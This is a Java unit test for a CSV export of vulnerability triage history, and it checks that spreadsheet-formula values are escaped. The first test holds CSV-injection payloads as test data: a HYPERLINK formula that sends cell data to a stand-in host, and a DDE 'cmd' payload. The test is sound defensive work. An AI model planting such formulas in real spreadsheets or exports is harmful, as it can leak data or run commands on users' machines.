package com.asmolabs.vectispire.core.services;

import static org.assertj.core.api.Assertions.assertThat;

import com.asmolabs.vectispire.core.services.TriageHistory.Decision;
import com.asmolabs.vectispire.core.services.TriageHistory.ObservedIssue;
import com.asmolabs.vectispire.core.services.TriageHistory.Repository;
import com.asmolabs.vectispire.core.services.TriageHistory.Scan;
import java.time.Instant;
import java.util.List;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;

@DisplayName("the triage history as CSV")
class TriageHistoryCsvTest {

    private static final Instant AT = Instant.parse("2026-09-01T10:00:00Z");

    @Test
    @DisplayName("a cell a spreadsheet would evaluate is forced to text, whoever wrote it")
    void formulasAreNeutralized() {
        // The export shipped with its quotes doubled and nothing else. Repository name, branch and
        // identifier come from whoever can commit to the target; the comment from whoever can
        // triage. Each of them reached an auditor's spreadsheet as a live formula.
        Repository repository = new Repository(
                1L, "=HYPERLINK(\"https://evil.invalid/?\"&A2,\"x\")", "https://example.invalid/r.git",
                "@main", null, null, 1, AT, 1, 1);
        Decision decision = new Decision(
                "under_review", "not_affected", "component_not_present",
                "+cmd|'/c calc'!A1", "alice", "manual", AT, null, 10L, null);
        ObservedIssue issue = new ObservedIssue(
                5L, "vulnerability", "-2+3", "HIGH", "pkg", "1.0", null,
                "open", "not_affected", AT, null, List.of(decision));
        Scan scan = new Scan(10L, "completed", "\tmain", null, null, AT, 1L, 1, 1, 0, null, List.of(issue));

        String row = TriageHistoryCsv.render(repository, List.of(scan)).lines().skip(1).findFirst().orElseThrow();

        assertThat(row)
                .contains("\"'=HYPERLINK(\"\"https://evil.invalid/?\"\"&A2,\"\"x\"\")\"")
                .contains("\"'\tmain\"")
                .contains("\"'-2+3\"")
                .contains("\"'+cmd|'/c calc'!A1\"");
    }

    @Test
    @DisplayName("an ordinary value is left exactly as it was")
    void plainValuesAreUntouched() {
        Repository repository = new Repository(1L, "shop", "https://example.invalid/r.git", "main", null, null, 1, AT, 0, 0);
        Scan scan = new Scan(10L, "completed", "main", null, null, AT, 1L, 0, 0, 0, null, List.of(
                new ObservedIssue(5L, "vulnerability", "CVE-2026-1", "HIGH", "pkg", "1.0", null,
                        "open", "under_review", AT, null, List.of())));

        String row = TriageHistoryCsv.render(repository, List.of(scan)).lines().skip(1).findFirst().orElseThrow();

        assertThat(row).startsWith("\"shop\",\"https://example.invalid/r.git\",\"10\"").contains("\"CVE-2026-1\"");
    }
}
